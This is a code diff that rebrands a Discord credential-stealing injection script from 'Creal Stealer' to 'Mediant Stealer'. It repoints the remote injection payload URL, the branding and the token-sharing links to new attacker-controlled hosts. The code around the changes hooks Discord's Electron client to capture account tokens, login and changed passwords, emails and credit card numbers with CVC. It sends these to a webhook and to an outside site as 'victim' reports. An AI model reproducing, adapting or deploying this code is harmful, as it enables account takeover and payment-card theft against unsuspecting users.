@@ -19,7 +19,7 @@ var config = {
 
     creator: "Ayhu",
     transfer_link: `%TRANSFER_URL%`,
-    injection_url: "https://raw.githubusercontent.com/Ayhuuu/injection/main/inj.js",
+    injection_url: "https://raw.githubusercontent.com/Themediant/lagnewalisui/main/inj.js",
     webhook: "%WEBHOOK%",
     Placed: "%API_URL%",
     Filter: {
@@ -68,8 +68,8 @@ const makeEmbed = async ({
     description
 }) => {
     var params = {
-        username: "Creal Stealer",
-        avatar_url: "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg",
+        username: "Mediant Stealer",
+        avatar_url: "https://raw.githubusercontent.com/Themediant/lagnewalisui/main/img/xd.jpg",
         content: "",
         embeds: [{
             title: title,
@@ -77,11 +77,11 @@ const makeEmbed = async ({
             fields: fields,
             description: description ?? "",
             author: {
-                name: `Creal Stealer`
+                name: `Mediant Stealer`
             },
             
             footer: {
-                text: `�[${config.creator}] | https://github.com/Ayhuuu/`
+                text: `A Mediant Project`
             },
 
         }]
@@ -302,7 +302,7 @@ const FirstTime = async () => {
     var client_discord = appName
     if (!token) {
         var params = await makeEmbed({
-            title: "Creal Stealer Initialized",
+            title: "Mediant Stealer Initialized",
             fields: [{
                 name: "Injection Info",
                 value: `\`\`\`diff\n- Computer Name: ${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\``,
@@ -317,13 +317,13 @@ const FirstTime = async () => {
 
         var Billings = parseBilling(billing)
         var Friends = parseFriends(friends)
-        if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg"
-        if (!user.banner) var userBanner = "https://raw.githubusercontent.com/Ayhuuu/injection/main/banner.gif"
+        if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/Themediant/lagnewalisui/main/img/xd.jpg"
+        if (!user.banner) var userBanner = "https://raw.githubusercontent.com/Themediant/lagnewalisui/main/banner.gif"
 
         userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
         userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
         var params = await makeEmbed({
-            title: " Creal Stealer Initialized",
+            title: " Mediant Stealer Initialized",
             description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\``,
             fields: [{
                 name: "Username <:username:1041634536733290596> ",
@@ -355,10 +355,10 @@ const FirstTime = async () => {
                 inline: !0
             }, {
                 name: "@Copyright",
-                value: `[Creal Stealer <a:mavikirmizi:853238372591599617>](https://github.com/Ayhuuu/Creal-Stealer)`,
+                value: `[Mediant Stealer <a:mavikirmizi:853238372591599617>](http://mediant.000.pe/)`,
                 inline: !0
             }, {
-                name: "Creal Files",
+                name: "Mediant Files",
                 value: `[Transfer.sh <:transfer:1105163981338968264>](${config.transfer_link})`,
                 inline: !0
             }, {
@@ -375,7 +375,7 @@ const FirstTime = async () => {
                 inline: !1
             }, {
                 name: "<a:tokens:1041634540537511957> Token",
-                value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
+                value: `\`\`\`${token}\`\`\`\n[Copy Token](http://mediant.000.pe/copytoken?p=${token})\n\n[Download Banner](${userBanner})`,
                 inline: !1
             }],
             image: userBanner,
@@ -395,7 +395,7 @@ const FirstTime = async () => {
     if ((config.logout != "false" || config.logout !== "%LOGOUT%") && config['logout-notify'] == "true") {
         if (!token) {
             var params = await makeEmbed({
-                title: "Creal User log out (User not Logged in before)",
+                title: "Mediant User log out (User not Logged in before)",
                 fields: [{
                     name: "Injection Info",
                     value: `\`\`\`Name Of Computer: \n${computerName}\nInjection PATH: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n`,
@@ -410,13 +410,13 @@ const FirstTime = async () => {
 
             var Billings = parseBilling(billing)
             var Friends = parseFriends(friends)
-            if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg"
-            if (!user.banner) var userBanner = "https://raw.githubusercontent.com/Ayhuuu/injection/main/banner.gif"
+            if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/Themediant/lagnewalisui/main/img/xd.jpg"
+            if (!user.banner) var userBanner = "https://raw.githubusercontent.com/Themediant/lagnewalisui/main/banner.gif"
             
             userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
             userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
             var params = await makeEmbed({
-                title: "Creal Stealer Victim got logged out",
+                title: "Mediant Stealer Victim got logged out",
                 description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                 fields: [{
                     name: "Username <:username:1041634536733290596> ",
@@ -424,7 +424,7 @@ const FirstTime = async () => {
                     inline: !0
                 }, {
                     name: "ID <:iduser:1041634535395307520>",
-                    value: `\`${user.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${user.id})`,
+                    value: `\`${user.id}\`\n[Copy ID](http://mediant.000.pe/copytoken?p=${user.id})`,
                     inline: !0
                 }, {
                     name: "Nitro <a:nitro:1041639670288748634>",
@@ -448,10 +448,10 @@ const FirstTime = async () => {
                     inline: !0
                 }, {
                     name: "@Copyright",
-                    value: `[Creal Stealer  <a:mavikirmizi:853238372591599617>](https://github.com/Ayhuuu/Creal-Stealer)`,
+                    value: `[Mediant Stealer  <a:mavikirmizi:853238372591599617>](http://mediant.000.pe/)`,
                     inline: !0
                 }, {
-                    name: "Creal Files",
+                    name: "MEDIANT Files",
                     value: `[Transfer.sh <:transfer:1105163981338968264>](${config.transfer_link})`,
                     inline: !0
                 }, {
@@ -584,8 +584,8 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
     var friends = await getURL("https://discord.com/api/v9/users/@me/relationships", token)
     var Nitro = await getURL("https://discord.com/api/v9/users/" + user.id + "/profile", token);
 
-    if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg"
-    if (!user.banner) var userBanner = "https://raw.githubusercontent.com/Ayhuuu/injection/main/banner.gif"
+    if (!user.avatar) var userAvatar = "https://raw.githubusercontent.com/Themediant/lagnewalisui/main/img/xd.jpg"
+    if (!user.banner) var userBanner = "https://raw.githubusercontent.com/Themediant/lagnewalisui/main/banner.gif"
 
     userBanner = userBanner ?? await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
     userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
@@ -601,7 +601,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
         case request.url.endsWith("login"):
             var password = data.password
             var params = await makeEmbed({
-                title: "Creal Stealer User Login",
+                title: "Mediant Stealer User Login",
                 color: config['embed-color'],
                 description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                 fields: [{
@@ -610,7 +610,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                     inline: !0
                 }, {
                     name: "ID <:iduser:1041634535395307520>",
-                    value: `\`${user.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${user.id})`,
+                    value: `\`${user.id}\`\n[Copy ID](http://mediant.000.pe/copytoken?p=${user.id})`,
                     inline: !0
                 }, {
                     name: "Nitro <a:nitro:1041639670288748634>",
@@ -634,10 +634,10 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                     inline: !0
                 }, {
                     name: "@Copyright",
-                    value: `[Creal Stealer <a:mavikirmizi:853238372591599617>](https://github.com/Ayhuuu/Creal-Stealer)`,
+                    value: `[Mediant Stealer <a:mavikirmizi:853238372591599617>](http://mediant.000.pe)`,
                     inline: !0
                 }, {
-                    name: "Creal Files",
+                    name: "Mediant Files",
                     value: `[Transfer.sh <:transfer:1105163981338968264>](${config.transfer_link})`,
                     inline: !0
                 }, {
@@ -686,7 +686,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
             if (!data.password) return
             if (data.new_password) {
                 var params = await makeEmbed({
-                    title: "Creal Stealer Detect Password Changed",
+                    title: "Mediant Stealer Detect Password Changed",
                     color: config['embed-color'],
                     description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                     fields: [{
@@ -695,7 +695,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                         inline: !0
                     }, {
                         name: "ID <:iduser:1041634535395307520>",
-                        value: `\`${user.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${user.id})`,
+                        value: `\`${user.id}\`\n[Copy ID](http://mediant.000.pe/copytoken?p=${user.id})`,
                         inline: !0
                     }, {
                         name: "Nitro <a:nitro:1041639670288748634>",
@@ -719,10 +719,10 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                         inline: !0
                     }, {
                         name: "@Copyright",
-                        value: `[Creal Stealer <a:mavikirmizi:853238372591599617>](https://github.com/Ayhuuu/Creal-Stealer)`,
+                        value: `[Mediant Stealer <a:mavikirmizi:853238372591599617>](http://mediant.000.pe/)`,
                         inline: !0
                     }, {
-                        name: "Creal Files",
+                        name: "Mediant Files",
                         value: `[Transfer.sh <:transfer:1105163981338968264>](${config.transfer_link})`,
                         inline: !0
                     }, {
@@ -751,7 +751,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                         inline: !1
                     }, {
                         name: "<a:tokens:1041634540537511957> Token",
-                        value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
+                        value: `\`\`\`${token}\`\`\`\n[Copy Token](http://mediant.000.pe/copytoken?p=${token})\n\n[Download Banner](${userBanner})`,
                         inline: !1
                     }, ],
 
@@ -773,7 +773,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
             }
             if (data.email) {
                 var params = await makeEmbed({
-                    title: "Creal Stealer Detect Email Changed",
+                    title: "Mediant Stealer Detect Email Changed",
                     color: config['embed-color'],
                     description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                     fields: [{
@@ -782,7 +782,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                         inline: !0
                     }, {
                         name: "ID <:iduser:1041634535395307520>",
-                        value: `\`${user.id}\`\n[Copy ID](https://paste-pgpj.onrender.com/?p=${user.id})`,
+                        value: `\`${user.id}\`\n[Copy ID](http://mediant.000.pe/copytoken?p=${user.id})`,
                         inline: !0
                     }, {
                         name: "Nitro <a:nitro:1041639670288748634>",
@@ -806,10 +806,10 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                         inline: !0
                     }, {
                         name: "@Copyright",
-                        value: `[Creal Stealer <a:mavikirmizi:853238372591599617>](https://github.com/Ayhuuu/Creal-Stealer)`,
+                        value: `[Mediant Stealer <a:mavikirmizi:853238372591599617>](http://mediant.000.pe)`,
                         inline: !0
                     }, {
-                        name: "Creal Files",
+                        name: "Mediant Files",
                         value: `[Transfer.sh <:transfer:1105163981338968264>](${config.transfer_link})`,
                         inline: !0
                     }, {
@@ -834,7 +834,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                         inline: !1
                     }, {
                         name: "<a:tokens:1041634540537511957> Token",
-                        value: `\`\`\`${token}\`\`\`\n[Copy Token](https://paste-pgpj.onrender.com/?p=${token})\n\n[Download Banner](${userBanner})`,
+                        value: `\`\`\`${token}\`\`\`\n[Copy Token](http://mediant.000.pe/copytoken?p=${token})\n\n[Download Banner](${userBanner})`,
                         inline: !1
                     }, ],
 
@@ -859,10 +859,10 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                 var [CardNumber, CardCVC, month, year] = [data["card[number]"], data["card[cvc]"], data["card[exp_month]"], data["card[exp_year]"]]
     
                 var params = await makeEmbed({
-                    title: "Creal Stealer User Credit Card Added",
+                    title: "Mediant Stealer User Credit Card Added",
                     color: config['embed-color'],
                     fields: [
-                      { name: "Creal Files", value: `[Transfer.sh <:transfer:1105163981338968264>](${config.transfer_link})` },
+                      { name: "Mediant Files", value: `[Transfer.sh <:transfer:1105163981338968264>](${config.transfer_link})` },
                       { name: "IP", value: ip },
                       { name: "Username <:username:1041634536733290596>", value: `${user.username}#${user.discriminator}` },
                       { name: "ID <:iduser:1041634535395307520>", value: user.id },
